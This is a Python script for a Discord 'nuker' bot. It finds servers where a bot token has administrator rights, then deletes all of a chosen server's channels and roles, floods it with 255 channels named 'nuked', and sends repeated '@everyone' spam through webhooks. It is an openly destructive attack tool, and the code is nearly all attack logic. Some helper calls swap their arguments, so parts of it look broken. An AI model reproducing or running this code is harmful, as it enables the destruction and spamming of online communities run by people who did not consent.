# add your bot token in line 100

import os, aiohttp, asyncio
from pystyle import *

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

# ============= #

class DiscordAPI:
    def __init__(self, token, session):
        self.headers = {"Authorization": f"Bot {token}"}
        self.session = session

    async def check_ok(self):
        async with self.session.get("https://discord.com/api/users/@me", headers=self.headers) as r:
            return r.ok

    async def fetch_guilds(self):
        async with self.session.get("https://discord.com/api/users/@me/guilds", headers=self.headers) as r:
            return await r.json()

    async def delete_channel(self, channel_id:int):
        async with self.session.delete(f"https://discord.com/api/channels/{channel_id}", headers=self.headers) as r:
            return await r.json()    

    async def delete_role(self, guild_id:int, role_id:int):
        async with self.session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=self.headers) as r:
            print(await r.text())

    async def fetch_channels(self, guild_id: int):
        async with self.session.get(f"https://discord.com/api/guilds/{guild_id}/channels", headers=self.headers) as r:
            return await r.json()       

    async def fetch_roles(self, guild_id: int):
        async with self.session.get(f"https://discord.com/api/guilds/{guild_id}/roles", headers=self.headers) as r:
            return await r.json()

    async def create_invite(self, channel_id: int):
        async with self.session.post(f"https://discord.com/api/v9/channels/{channel_id}/invites", headers=self.headers, json={"max_age":2592000,"max_uses":0,"target_type":None,"target_user_id":None,"temporary":None,"flags":0}) as r:
            return await r.json()

    async def create_channel(self, guild_id: int, name:str, type: int):
        async with self.session.post(f"https://discord.com/api/guilds/{guild_id}/channels", headers=self.headers, json={"name":name,"type":type, "topic":"/evanescent"}) as r:
            channel_data = await r.json()

            try:
                print(channel_data['id'])
                async with self.session.post(f"https://discord.com/api/channels/{channel_data['id']}/webhooks", headers=self.headers, json={"name":"nuked"}) as r:
                    webhook_data = await r.json()

                    for x in range(35):
                        async with self.session.post(webhook_data['url'], json={"content":"@everyone /evanescent"}) as r:
                            pass

                    return webhook_data
                
            except Exception as e:
                print(e)

    async def bot_info(self):
        async with self.session.get("https://discord.com/api/users/@me", headers=self.headers) as r:
            return {"status_code":r.status, "json":await r.json()}   

async def create_channel_task(session, token, guild_id:int):
    discord_api = DiscordAPI(session, token)
    channel_data = await discord_api.create_channel(guild_id, "nuked", 0)

async def channel_delete_task(token, session, channels):
    discord_api = DiscordAPI(session, token)
    tasks = []

    for channel in channels:
        tasks.append(asyncio.create_task(discord_api.delete_channel(channel['id'])))

    await asyncio.gather(*tasks)

async def role_delete_task(session, token, roles, guild_id):
    async with aiohttp.ClientSession() as session:
        discord_api = DiscordAPI(token, session)
        tasks = []

        for role in roles:
            tasks.append(asyncio.create_task(discord_api.delete_role(guild_id, role['id'])))

        await asyncio.gather(*tasks)

async def channel_create_task(token, session, guild_id:int):
    discord_api = DiscordAPI(session, token)
    tasks = []

    for x in range(255):
        tasks.append(asyncio.create_task(discord_api.create_channel(guild_id, "nuked", 0)))

    await asyncio.gather(*tasks)

# ============= #

async def main():
    token = ""

    async with aiohttp.ClientSession() as session:
        discord_api = DiscordAPI(token, session)
        validate_request = await discord_api.check_ok()

        if validate_request != True:
            print(f"{Colors.red}[X] {Colors.orange}Token Invalid{Colors.reset}")
            exit()

        else:

            bot_guilds = await discord_api.fetch_guilds() ; information  = await discord_api.bot_info()
            admin_servers = []

            for guild in bot_guilds:
                if guild['permissions'] & 0x8:
                    admin_servers.append(guild['id'])

            while True: 
                clear()
                print(Colorate.Vertical(Colors.purple_to_red, """
                                        
 ▄█    █▄     ▄████████ ███▄▄▄▄    ▄█     ▄████████    ▄█    █▄    
███    ███   ███    ███ ███▀▀▀██▄ ███    ███    ███   ███    ███   
███    ███   ███    ███ ███   ███ ███▌   ███    █▀    ███    ███   
███    ███   ███    ███ ███   ███ ███▌   ███         ▄███▄▄▄▄███▄▄ 
███    ███ ▀███████████ ███   ███ ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  
███    ███   ███    ███ ███   ███ ███           ███   ███    ███   
███    ███   ███    ███ ███   ███ ███     ▄█    ███   ███    ███   
 ▀██████▀    ███    █▀   ▀█   █▀  █▀    ▄████████▀    ███    █▀    
                                                                   
                                          """, 1))
                Write.Print(f"Connected to {information['json']['username']}\n", Colors.red_to_orange, interval=0.025)
                Write.Print(f"Connected to {len(bot_guilds)} servers\n", Colors.orange_to_yellow, interval=0.025)
                Write.Print(f"Admin in {len(admin_servers)} servers\n", Colors.yellow_to_green, interval=0.025)
                Write.Print(f"Made by Nepoznat, Rust || Modified by Zenith\n", Colors.green_to_blue, interval=0.025)
                print(f"{Colors.yellow}[{'='*50}]{Colors.orange} > {Colors.light_blue}Bot Servers {Colors.orange}< {Colors.yellow}[{'='*50}]{Colors.reset}\n")

                for guild in bot_guilds:
                    channels = await discord_api.fetch_channels(guild['id'])
                    for channel in channels:
                        invite = await discord_api.create_invite(channel['id'])
                        if invite['code'] == 10003:
                            pass
                        else:
                            print(f"""{Colors.yellow}[?] Server Name: {guild['name']}{Colors.yellow}{Colors.reset}\n{Colors.yellow}[?] Server ID: {guild['id']}{Colors.yellow}{Colors.reset}\n{Colors.yellow}[?] Server Invite: https://discord.gg/{invite['code']}{Colors.yellow}{Colors.reset}\n""")
                            break

                guild_id = Write.Input("Enter the guild id -> ", Colors.cyan_to_blue, interval=0.0025)
                channels = await discord_api.fetch_channels(guild_id)
                print(f"{Colors.yellow}Starting Channel Delete Task...{Colors.reset}", end="")

                await channel_delete_task(session, token, channels)
                print(f"{Colors.green} Deleted all channels.{Colors.reset}")
                roles = await discord_api.fetch_roles(guild_id)
                print(roles)
                print(f"{Colors.yellow}Starting Role Delete Task...{Colors.reset}", end="")

                await role_delete_task(session, token, roles, guild_id)
                print(f"{Colors.green}Done{Colors.reset}")
                print(f"{Colors.yellow}Starting Channel Create Task...{Colors.reset}", end="")

                await channel_create_task(session, token, guild_id)
                print(f"{Colors.green} Created channels.{Colors.reset}")
                input(f"\n{Colors.yellow}Hit 'Enter' to exit{Colors.reset}\n")
        

if __name__ == "__main__":
    asyncio.run(main())
